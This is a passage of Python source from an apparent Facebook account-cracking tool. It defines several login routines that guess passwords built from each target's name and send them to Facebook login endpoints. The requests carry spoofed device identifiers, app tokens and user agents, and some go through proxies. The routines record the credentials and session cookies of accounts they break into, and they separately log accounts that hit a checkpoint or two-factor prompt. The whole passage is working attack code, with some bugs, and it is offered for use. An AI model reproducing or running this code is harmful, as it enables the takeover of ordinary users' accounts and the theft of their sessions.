                        inform = random.choice(['X697','X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['GLOBE','TM','TNT','SMART','Verizon','Sprint','Zong','null','Airtel','Gp','Roshan','Marshmallow','Telenor','Ufone','Jazz'])
                        
                        ua = ethan_update_m2()
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        
                        # بنیادی لاگ ان ڈیٹا پیرامیٹرز (آپ کے نئے ٹوکن کے مطابق)
                        data = {
                                "adid": adid,
                                "format": "json",
                                "device_id": str(uuid.uuid4()),
                                "cpl": "true",
                                "family_device_id": str(uuid.uuid4()),
                                "credentials_type": "device_based_login_password",
                                "error_detail_type": "button_with_disabled",
                                "source": "device_based_login",
                                "email": ids,
                                "password": pas,
                                "access_token": "920925107441449|b2983aafb79c7b8817c559604f7adc44",
                                "generate_session_cookies": "1",
                                "meta_inf_fbmeta": "",
                                "advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
                                "currently_logged_in_userid": "0",
                                "locale": "en_US",
                                "client_country_code": "US",
                                "method": "auth.login",
                                "fb_api_req_friendly_name": "authenticate",
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                                "api_key": "920925107441449"
                        }

                        # --- فیس بک لازمی سیکیورٹی سگنیچر (sig) جنریٹر ---
                        secret = "b2983aafb79c7b8817c559604f7adc44"
                        sig_data = "".join(f"{k}={v}" for k, v in sorted(data.items())) + secret
                        data["sig"] = hashlib.md5(sig_data.encode("utf-8")).hexdigest()

                        # ہیڈرز کو نئے ٹوکن کے نیٹ ورک کے مطابق ہم آہنگ کر دیا گیا ہے
                        headers = {
                                'User-Agent': ua,
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Host': 'b-graph.facebook.com',
                                'X-FB-Net-HNI': '25227',
                                'X-FB-SIM-HNI': '29752',
                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                'X-Tigon-Is-Retry': 'False',
                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                'x-fb-device-group': '5120',
                                'X-FB-Friendly-Name': 'authenticate',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'x-fb-connection-token': 'b2983aafb79c7b8817c559604f7adc44'
                        }

                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url, data=data, headers=headers).json()

                        if 'session_key' in po:
                                        print('\r\r\x1b[38;5;46m[HASSAN.ALI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        q = po
                                        powerRMX = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                        RMXramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookie = f"sb={RMXramxan};{powerRMX}"
                                        open('/sdcard/HASSAN.ALI-TOOL/FILE/RMX-M2-COOKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/HASSAN.ALI-TOOL/FILE/RMX-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[HASSAN.ALI-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'error' in po and 'message' in po['error'] and 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[HASSAN.ALI-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RMX-TOOL/FILE/RMX-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/HASSAN.ALI-TOOL/FILE/RMX-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api2(ids,names,passlist)
        except Exception as e:
                pass

#▬▭▬▭▬▭▬▭[FILE METHOD 3]▬▭▬▭▬▭▬▭#
def api3(ids,names,passlist):
        try:
                global loop,oks,cps,sim_id
                sys.stdout.write('\r\r\033[1;37m[M3] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['GLOBE','TM','TNT','SMART','Verizon','Sprint','Zong','null','Airtel','Gp','Roshan','Marshmallow','Telenor','Ufone','Jazz'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/250.0.0.11.114;FBBV/28055324;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-P905V;FBSV/11;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid': adid,
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': ids,
'password': pas,
'method': 'auth.login',
'generate_session_cookies': '1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'error_detail_type': 'button_with_disabled',
'source': 'account_recovery',
'locale': 'en_US',
'client_country_code': 'US',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
                        headers={'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'Priority': 'u=3, i',
'X-Fb-Sim-Hni': '45204',
'X-Fb-Net-Hni': '45201',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
'User-Agent': ua,
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'MOBILE.LTE',
'X-Fb-Device-Group': '5120',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '847'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\x1b[38;5;46m[HASSAN.ALI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/HASSAN.ALI-TOOL/FILE/RMX-M3-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/HASSAN.ALI-TOOL/FILE/RMX-M3-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[HASSAN.ALI-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[HASSAN.ALI-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/HASSAN.ALI-TOOL/FILE/RMX-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/HASSAN.ALI-TOOL/FILE/RMX-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api3(ids,names,passlist)
        except Exception as e:
                pass
#▬▭▬▭▬▭▬▭[FILE METHOD 4]▬▭▬▭▬▭▬▭#
def api4(ids,names,passlist):
        global loop,oks,cps,sim_id
        sys.stdout.write('\r\r\033[1;37m[M4] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        android_version=str(random.randrange(6,13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice(['itel vesion 3 plus','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                        fbap = random.choice(['738.0.0.11.397','60.0.0.16.76','419.0.0.20.71','504.0.0.28482','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','400.0.0.37.76','414.0.0.30.113','408.1.0.16.113'])
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.1,width=1080,height=1463};FBLC/en_US;FBRV/'+fbrv+';FBCR/NOS Portugal;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung Galaxy Note 10+;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:]'               
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en;q=0.9,si-LK;q=0.8,si;q=0.7,en-US;q=0.6'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        RMX=session.cookies.get_dict().keys()
                        if "c_user" in RMX:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\x1b[38;5;46m[HASSAN.ALI-ALIVE] '+ids+' | '+pas+'\033[1;97m')
                                open('/sdcard/HASSAN.ALI-TOOL/FILE/RMX-M4-COOKIE.txt','a').write(ids+'|'+pas+' | '+kuki+'\n')
                                open('/sdcard/HASSAN.ALI-TOOL/FILE/RMX-M4-OK.txt','a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RMX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[HASSAN.ALI-DEAD] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HASSAN.ALI-TOOL/FILE/RMX-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api4(ids,names,passlist)
        except Exception as e:pass
#▬▭▬▭▬▭▬▭[FILE METHOD 5]▬▭▬▭▬▭▬▭#
def api5(ids,names,passlist):
    try:
        global loop,oks,cps,sim_id
        sys.stdout.write('\r\r\033[1;37m[M5] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
            nip = random.choice(proxsi)
            proxs = {
                   'http': 'socks4://' + nip }
            data = {"adid": str(uuid.uuid4()),
'method': 'POST',
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'email': ids,
'password': pas,
'cpl': 'true',
'credentials_type': 'password',
'generate_session_cookies': '1',
'error_detail_type': 'button_with_disabled',
'generate_machine_id': '1',
'locale': 'en_GB',
'client_country_code': 'GB',
'omit_response_on_success': 'false',
'enroll_misauth': 'false',
'advertising_id': str(uuid.uuid4()),
'encrypted_msisdn': '',
'fb_api_req_friendly_name': 'authenticate'}
            headers={'Host': 'graph.facebook.com',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
'x-fb-connection-bandwidth': '29920503', 
'x-fb-net-hni': '34528', 
'x-fb-sim-hni': '38333', 
'Zero-Rated': '0', 
'x-fb-connection-quality': 'EXCELLENT', 
'x-fb-connection-type': 'MOBILE.LTE', 
'user-agent': ethan_update_m5(), 
'content-type': 'app_authlication/x-www-form-urlencoded',
'x-fb-http-engine': 'Liger',
'x-fb-client-IP': 'True',
'x-fb-server-cluster': 'Keep-Alive',
'Content-Type': 'application/json'}
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            po = requests.post(url,data=data,proxies=proxs,headers=headers,).json()
            if 'session_key' in po:
                print('\r\r\x1b[38;5;46m[HASSAN.ALI-OK] '+ids+' | '+pas+'\033[1;97m')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookies = f"sb={ssbb};{coki}"
                open('/sdcard/HASSAN.ALI-TOOL/FILE/HASSAN.ALI-M5-COOKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                open('/sdcard/HASSAN.ALI-TOOL/FILE/HASSAN.ALI-M5-OK.txt','a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif twf in str(po):
                  if 'y' in pcp:
                     print('\r\r\033[1;34m[HASSAN.ALI-2F] '+ids+' | '+pas)
                     twf.append(ids)
                     break
            elif 'www.facebook.com' in po['error']['message']:
                  if 'y' in pcp:        
                    print('\r\r\x1b[1;31m[HASSAN.ALI-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/HASSAN.ALI-TOOL/FILE/RMX-M5-CP.txt','a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        api5(ids,names,passlist)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[RANDOM METHOD 1]▬▭▬▭▬▭▬▭#
def rmx1(ids,passlist):
    global loop,oks,cps,sim_id
    sys.stdout.write('\r\r\033[1;37m[M1] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
    try:
        for pas in passlist:
            session=requests.session()
            pro=dalvik_uaa_bd_large()
            link=session.get("https://mbasic.facebook.com/").text
            rr=random.randint
            data={
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': 'p',
            '__hs': '20156.BP:wbloks_caa_pkg.2.0...0',
            'dpr': '1',
            '__ccg': 'MODERATE',
            '__rev': '1020727961',
            '__s': ':i9p1qu:mahlv2',
            '__hsi': '7479797114083238570',
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
            '__csr': '',
            '__hsdp': '',
            '__hblp': '',
            'fb_dtsg': 'NAcNUIYwJi18an1KNSKvDEsLdLTDlQVpg1Vud66BoblVCSXRf0aNVow:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1), 
            'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1), 
            'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"nlnwft:68\\",\\"password_text_input_id\\":\\"nlnwft:69\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"142710911300379\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"contact_point\\":\\"'+ids+'\\",\\"password\\":\\"#PWD_BROWSER:0:'+str(time.time()).split('.')[0]+':'+pas+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"lois_settings\\":{\\"lois_token\\":\\"\\"}}}"}',}
            headers = {
            'authority': 'mbasic.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"23090RA98G"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': pro,}
            session.post('https://mbasic.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=2c4733784ae1256fe36c8fac264a2939b8558cfc1bad5ac672c9bc60482cab5a',headers=headers, data=data).text
            RMX=session.cookies.get_dict().keys()
            if "c_user" in RMX:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid=coki.split("c_user=")[1].split(";")[0]
                nonvx=session.cookies.get_dict()["xs"][-2:]
                print('\r\r\x1b[38;5;46m[HASSAN.ALI-OK] '+uid+' | '+pas+'\033[1;97m') 
                open('/sdcard/HASSAN.ALI-TOOL/RANDOM/RMX-M1-COOKIE.txt','a').write(uid+'|'+pas+' | '+coki+'\n')
                open('/sdcard/HASSAN.ALI-TOOL/RANDOM/HASSAN.ALI-M1-OK.txt','a').write(uid+'|'+pas+'\n')
                oks.append(uid)
            elif "checkpoint" in RMX:
                print('\r\r\x1b[1;31m[HASSAN.ALI-CP] '+ids+' | '+pas+'\033[1;97m')
                open('/sdcard/HASSAN.ALI-TOOL/RANDOM/HASSAN.ALI-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[RANDOM METHOD 2]▬▭▬▭▬▭▬▭#
def rmx2(ids,passlist):
    global loop,oks,cps,sim_id
    sys.stdout.write('\r\r\033[1;37m[M2] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
    try:
        for pas in passlist:
            adid = str(uuid.uuid4())
            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32" 
            data = {
            'adid':adid,
            'format':'json',
            'device_id':adid,
            'email':ids,
            'password':pas,
            "logged_out_id": str(uuid.uuid4()),
            "hash_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            'generate_analytics_claims':'1',
            'credentials_type':'password',
            'source':'login',
            "sim_country": "id",
            "network_country": "id",
            "relative_url": "method/auth.login",
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            "locale":"en_US","client_country_code":"US",
            'fb_api_req_friendly_name':'authenticate',
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",} 
            head = {
            'Authorization':f'OAuth {accessToken}',
            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-FB-device-group': str(random.randint(2000, 4000)),
            "X-FB-Friendly-Name": "ViewerReactionsMutation",
            "X-FB-Request-Analytics-Tags": "graphservice",
            'X-FB-Friendly-Name':'authenticate',
            'X-FB-Connection-Type':'unknown',
            'X-FB-connection-quality':'EXCELLENT',
            "X-Tigon-Is-Retry": "False",
            'User-Agent': generate_real_ua(),
            "X-FB-connection-token": "d29d67d"+"37eca387482a"+"8a5b740f84f62",
            'Accept-Encoding':'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            "X-FB-Client-IP": "True",
            "X-FB-Server-Cluster": "True",
            'X-FB-HTTP-Engine': 'Liger'
            }
            url = "https:"+"//b-"+"api.face"+"book.co"+"m/meth"+"od/a"+"uth.login"
            po = requests.post(url,data=data,headers=head).text
            q = json.loads(po)
            if 'session_key' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                uid=str(q['uid'])
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print('\r\r\x1b[38;5;46m[HASSAN.ALI-OK] '+uid+' | '+pas+'\033[1;97m')
